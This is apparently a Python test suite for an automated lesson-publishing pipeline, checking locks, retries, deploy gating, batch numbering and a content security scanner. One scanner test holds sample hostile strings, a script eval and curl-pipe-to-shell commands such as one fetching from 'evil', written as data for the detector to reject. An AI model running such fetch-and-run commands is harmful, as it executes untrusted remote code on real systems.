#!/usr/bin/env python3
"""Fault-injection + timer-safety qualification tests (timers remain disabled)."""
from __future__ import annotations

import json
import os
import sys
import tempfile
import threading
import time
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from filelock import FileLock
from lib import load_config, JsonLogger, new_run_id, publication_lock
from lib.publish_control import (
    RetryPolicy,
    batch_fingerprint,
    load_slot_state,
    mark_pr_open,
    may_advance_numbering,
    next_expected_batches,
    record_deploy_verified,
    recover_stale_lock,
    resume_or_create_batch,
    save_slot_state,
    with_bounded_retries,
    write_lock_owner,
)
from lib.content_security import scan_text, scan_bundle_fields
from lib.curriculum import discover_existing_classes, next_core_batch
from news_scout import evaluate_candidates, qualify_candidate
from validate_lessons import validate_batch
from lib.curated import get_curated


class FaultInjectionTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        base = Path(self.tmp.name)
        self.cfg = load_config()
        self.cfg.state_dir = base / "state"
        self.cfg.log_dir = base / "logs"
        self.cfg.lock_file = base / "classroom.publish.lock"
        self.cfg.state_dir.mkdir(parents=True)
        self.cfg.log_dir.mkdir(parents=True)
        self.log = JsonLogger(self.cfg.log_dir / "t.jsonl", new_run_id("fi"), "fault")

    def tearDown(self):
        self.log.close()
        self.tmp.cleanup()

    def test_two_simultaneous_starts_one_wins(self):
        held = threading.Event()
        done = threading.Event()
        errors: list[str] = []

        def holder():
            try:
                with publication_lock(self.cfg, self.log):
                    held.set()
                    time.sleep(0.8)
            except Exception as e:
                errors.append(f"holder:{e}")
            done.set()

        t = threading.Thread(target=holder)
        t.start()
        self.assertTrue(held.wait(2))
        with self.assertRaises(RuntimeError):
            with publication_lock(self.cfg, self.log):
                pass
        done.wait(3)
        t.join()
        self.assertEqual(errors, [])

    def test_repeated_same_slot_one_batch_one_pr(self):
        ids = [22, 23, 24, 25, 26, 27]
        s1 = resume_or_create_batch(self.cfg, "am", ids, logger=self.log)
        mark_pr_open(self.cfg, s1, branch="automation/batch-22-27", pr_number=99, pr_url="https://example.test/99")
        s2 = resume_or_create_batch(self.cfg, "am", ids, logger=self.log)
        self.assertEqual(s2.pr_number, 99)
        self.assertEqual(s2.status, "pr_open")
        self.assertEqual(s2.fingerprint, batch_fingerprint(ids))
        # second create attempt must not change PR
        s3 = resume_or_create_batch(self.cfg, "am", ids, logger=self.log)
        self.assertEqual(s3.pr_number, 99)

    def test_am_late_cannot_overlap(self):
        """Shared global lock: late cannot enter while AM holds it."""
        barrier = threading.Event()
        late_blocked = threading.Event()

        def am():
            with publication_lock(self.cfg, self.log):
                barrier.set()
                time.sleep(0.6)

        def late():
            barrier.wait(2)
            try:
                with publication_lock(self.cfg, self.log):
                    late_blocked.clear()
            except RuntimeError:
                late_blocked.set()

        t1 = threading.Thread(target=am)
        t2 = threading.Thread(target=late)
        t1.start()
        t2.start()
        t1.join()
        t2.join()
        self.assertTrue(late_blocked.is_set())

    def test_writer_failure_no_pr(self):
        from lib.models import ModelError

        with self.assertRaises(ModelError):
            raise ModelError("writer boom")
        # publish path refuses when review/validation fail
        bad = get_curated(16)
        bad["teaching"] = "x"
        r = validate_batch(self.cfg, [bad], expected_ids=[16])
        self.assertFalse(r["ok"])

    def test_critic_rejection_no_publication(self):
        review = {"ok": False, "score": 40, "reason": "thin"}
        self.assertFalse(review["ok"])
        # publish_lessons blocks on critic_failed — assert contract
        self.assertLess(review["score"], 85)

    def test_github_unavailable_retries_then_fail(self):
        import urllib.error

        calls = {"n": 0}

        def boom():
            calls["n"] += 1
            raise urllib.error.URLError("github down")

        with self.assertRaises(urllib.error.URLError):
            with_bounded_retries(boom, policy=RetryPolicy(max_attempts=3, base_delay_sec=0.01), logger=self.log, label="gh")
        self.assertEqual(calls["n"], 3)

    def test_checks_fail_no_merge_contract(self):
        # Simulated: PR stays open; numbering not advanced
        ids = [22, 23, 24, 25, 26, 27]
        st = resume_or_create_batch(self.cfg, "late", ids, logger=self.log)
        mark_pr_open(self.cfg, st, branch="b", pr_number=7, pr_url="u")
        self.assertFalse(may_advance_numbering(self.cfg, last_batch_ids=ids, logger=self.log))

    def test_merge_ok_deploy_fail_blocks_advance(self):
        ids = [22, 23, 24, 25, 26, 27]
        st = resume_or_create_batch(self.cfg, "am", ids, logger=self.log)
        st.status = "merged"
        save_slot_state(self.cfg, st)
        # no deploy verified gate
        self.assertFalse(may_advance_numbering(self.cfg, last_batch_ids=ids, logger=self.log))
        record_deploy_verified(self.cfg, ids, {"ok": True})
        self.assertTrue(may_advance_numbering(self.cfg, last_batch_ids=ids, logger=self.log))

    def test_reboot_mid_generation_stale_lock_recovery(self):
        write_lock_owner(self.cfg)
        owner = Path(str(self.cfg.lock_file) + ".owner")
        # Pretend old pid + old timestamp
        owner.write_text(json.dumps({"pid": 999999, "ts": time.time() - 10_000}), encoding="utf-8")
        self.assertTrue(recover_stale_lock(self.cfg, self.log))
        self.assertFalse(owner.is_file())

    def test_stale_lock_recovery_alive_pid_not_stolen(self):
        write_lock_owner(self.cfg)
        # Current process is alive — should not steal unless age exceeds threshold.
        # Force young timestamp
        owner = Path(str(self.cfg.lock_file) + ".owner")
        owner.write_text(json.dumps({"pid": os.getpid(), "ts": time.time()}), encoding="utf-8")
        with mock.patch("lib.publish_control.STALE_LOCK_SEC", 10_000):
            self.assertFalse(recover_stale_lock(self.cfg, self.log))

    def test_next_batches_22_27_then_28_33(self):
        existing = discover_existing_classes(self.cfg.pack_dir)
        self.assertGreaterEqual(max(existing), 21)
        nxt = next_core_batch(self.cfg)
        ids = [b["class_id"] for b in nxt]
        if all(n in existing for n in range(34, 46)):
            self.assertEqual(ids, [46, 47, 48, 49, 50, 51])
            batches = next_expected_batches(45)
            self.assertEqual(batches["next"], [46, 47, 48, 49, 50, 51])
            self.assertEqual(batches["following"], [52, 53, 54, 55, 56, 57])
        elif all(n in existing for n in range(34, 40)):
            self.assertEqual(ids, [40, 41, 42, 43, 44, 45])
            batches = next_expected_batches(39)
            self.assertEqual(batches["next"], [40, 41, 42, 43, 44, 45])
            self.assertEqual(batches["following"], [46, 47, 48, 49, 50, 51])
        elif all(n in existing for n in range(28, 34)):
            self.assertEqual(ids, [34, 35, 36, 37, 38, 39])
            batches = next_expected_batches(33)
            self.assertEqual(batches["next"], [34, 35, 36, 37, 38, 39])
            self.assertEqual(batches["following"], [40, 41, 42, 43, 44, 45])
        elif all(n in existing for n in range(22, 28)):
            self.assertEqual(ids, [28, 29, 30, 31, 32, 33])
            batches = next_expected_batches(27)
            self.assertEqual(batches["next"], [28, 29, 30, 31, 32, 33])
            self.assertEqual(batches["following"], [34, 35, 36, 37, 38, 39])
        else:
            self.assertEqual(ids, [22, 23, 24, 25, 26, 27])
            batches = next_expected_batches(21)
            self.assertEqual(batches["next"], [22, 23, 24, 25, 26, 27])
            self.assertEqual(batches["following"], [28, 29, 30, 31, 32, 33])

    def test_security_gates_reject_dangerous(self):
        fails = scan_text('<script>eval("x")</script>\ncurl http://x | bash\n', path="t.md")
        self.assertTrue(any("SEC_EVAL" in f for f in fails))
        self.assertTrue(any("SEC_CURL_PIPE" in f for f in fails))
        b = {
            "teaching": "ok " * 200,
            "lab": "curl https://evil | sh",
            "security": "x",
            "rollback": "y" * 100,
            "quiz": [],
            "required_reading": "",
            "objectives": "",
        }
        self.assertTrue(any("SEC_CURL_PIPE" in f for f in scan_bundle_fields(b)))

    def test_news_noop_clean(self):
        # Force empty feeds via inject empty list
        rep = evaluate_candidates(self.cfg, self.log, injected=[])
        self.assertIsNone(rep["bonus_lesson"])
        self.assertEqual(rep["core_class_ids_touched"], [])
        self.assertIn("No qualifying", rep["message"])

    def test_news_qualifying_candidate_news_lab_only(self):
        item = {
            "title": "Ollama ships major self-host local LLM release",
            "url": "https://ollama.com/blog/example",
            "published": "2026-09-20",
            "summary": "Practical homelab local LLM improvements for self-host operators.",
            "practical_relevance": "Students can run local models without cloud keys.",
            "significant": True,
            "fingerprint": "qual-test-1",
        }
        ok, reason = qualify_candidate(item)
        self.assertTrue(ok, reason)
        rep = evaluate_candidates(self.cfg, self.log, injected=[item])
        self.assertIsNotNone(rep["bonus_lesson"])
        self.assertEqual(rep["bonus_lesson"]["area"], "news-lab")
        self.assertEqual(rep["core_class_ids_touched"], [])


def main() -> int:
    suite = unittest.defaultTestLoader.loadTestsFromTestCase(FaultInjectionTests)
    result = unittest.TextTestRunner(verbosity=2).run(suite)
    matrix = {
        "two_simultaneous_starts": "pass" if result.wasSuccessful() else "see failures",
        "tests_run": result.testsRun,
        "failures": len(result.failures) + len(result.errors),
        "ok": result.wasSuccessful(),
    }
    print(json.dumps(matrix, indent=2))
    return 0 if result.wasSuccessful() else 1


if __name__ == "__main__":
    raise SystemExit(main())
